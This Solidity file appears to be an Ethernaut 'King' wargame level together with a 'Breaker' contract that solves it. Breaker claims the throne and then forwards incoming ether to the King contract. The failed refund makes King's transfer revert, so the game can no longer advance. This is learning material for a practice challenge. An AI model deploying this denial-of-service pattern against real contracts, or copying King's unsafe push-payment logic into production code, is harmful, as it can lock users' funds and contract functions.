/**
 *Submitted for verification at Etherscan.io on 2021-08-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


contract Breaker{
    address payable constant king = 0x9dF377B64641B786c4a5E12c766E6161561570e7;
    constructor() public payable{
        
    }
    receive() external payable{
        king.transfer(msg.value);
    }
    function attack() external payable {
        king.transfer(msg.value);
    }
}